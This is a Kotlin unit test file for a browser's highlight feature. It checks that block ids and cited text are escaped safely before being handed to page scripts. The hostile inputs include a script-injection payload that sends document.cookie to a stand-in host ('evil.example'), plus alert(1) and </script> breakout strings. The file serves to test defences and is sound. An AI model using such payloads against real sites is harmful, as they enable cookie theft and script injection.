package com.dantech.skimbrowser.browser.page

import kotlinx.serialization.json.Json
import kotlinx.serialization.json.JsonNull
import kotlinx.serialization.json.jsonObject
import kotlinx.serialization.json.jsonPrimitive
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Test

class HighlightRequestTest {

    @Test
    fun onlyDigitBlockIdsAreAccepted() {
        assertNull(highlightArgsJson(request(blockId = "")))
        assertNull(highlightArgsJson(request(blockId = "-1")))
        assertNull(highlightArgsJson(request(blockId = "1.5")))
        assertNull(highlightArgsJson(request(blockId = "12 ")))
        assertNull(highlightArgsJson(request(blockId = "0\"]")))
        assertNull(highlightArgsJson(request(blockId = "１２")))
        assertNull(highlightArgsJson(request(blockId = "1234567890")))

        assertEquals("""{"id":"12","cited":null,"url":"https://example.com/"}""", highlightArgsJson(request(blockId = "12")))
    }

    @Test
    fun citedTextThatTriesToEndTheStringStaysInsideIt() {
        val hostile = listOf(
            "`);fetch('//evil.example/'+document.cookie)//",
            "\${fetch('//evil.example')}",
            "'),alert(1),('",
            "\"]'),alert(1),('",
            "</script><script>alert(1)</script>",
            "line\u2028break\u2029paragraph",
            "back\\slash\" and \"quotes\"",
        )

        hostile.forEach { cited ->
            val json = highlightArgsJson(request(blockId = "7", cited = cited)) ?: throw AssertionError("refused $cited")

            // Read back as JSON: exactly one object with the two values, unchanged.
            val parsed = Json.parseToJsonElement(json).jsonObject
            assertEquals(setOf("id", "cited", "url"), parsed.keys)
            assertEquals("7", parsed.getValue("id").jsonPrimitive.content)
            assertEquals(cited, parsed.getValue("cited").jsonPrimitive.content)
            assertEquals("https://example.com/", parsed.getValue("url").jsonPrimitive.content)
            // Nothing that can end a script string or block survives unescaped.
            assertFalse(json.contains('\u2028') || json.contains('\u2029'))
            assertFalse(json.contains('<') || json.contains('>'))
            assertEquals("the only unescaped quotes are the JSON ones", 12, unescapedQuotes(json))
        }
    }

    @Test
    fun thePageUrlTravelsWithTheArgumentAndCannotEndItsString() {
        val hostile = "https://evil.example/\"});alert(1);({\"a\":\"</script>\u2028?q=`${'$'}{x}`&b='c'"

        val json = highlightArgsJson(request(blockId = "4", url = hostile))!!

        val parsed = Json.parseToJsonElement(json).jsonObject
        assertEquals(setOf("id", "cited", "url"), parsed.keys)
        assertEquals(hostile, parsed.getValue("url").jsonPrimitive.content)
        assertFalse(json.contains('\u2028') || json.contains('<') || json.contains('>') || json.contains('&'))
        assertEquals("the only unescaped quotes are the JSON ones", 10, unescapedQuotes(json))
    }

    @Test
    fun aMissingOrBlankCitationIsNull() {
        val parsed = Json.parseToJsonElement(highlightArgsJson(request(blockId = "3", cited = "  "))!!).jsonObject

        assertEquals(JsonNull, parsed["cited"])
    }

    @Test
    fun aLongCitationIsCutToItsStart() {
        val json = highlightArgsJson(request(blockId = "3", cited = "a".repeat(5_000)))!!

        val cited = Json.parseToJsonElement(json).jsonObject.getValue("cited").jsonPrimitive.content
        assertEquals(1_000, cited.length)
        assertTrue(cited.all { it == 'a' })
    }

    private fun request(blockId: String, cited: String? = null, url: String = "https://example.com/") =
        HighlightRequest(expectedUrl = url, expectedNonce = 1, blockId = blockId, citedText = cited)

    /** Double quotes not preceded by an odd number of backslashes. */
    private fun unescapedQuotes(json: String): Int {
        var count = 0
        json.forEachIndexed { index, char ->
            if (char != '"') return@forEachIndexed
            var backslashes = 0
            var before = index - 1
            while (before >= 0 && json[before] == '\\') {
                backslashes++
                before--
            }
            if (backslashes % 2 == 0) count++
        }
        return count
    }
}
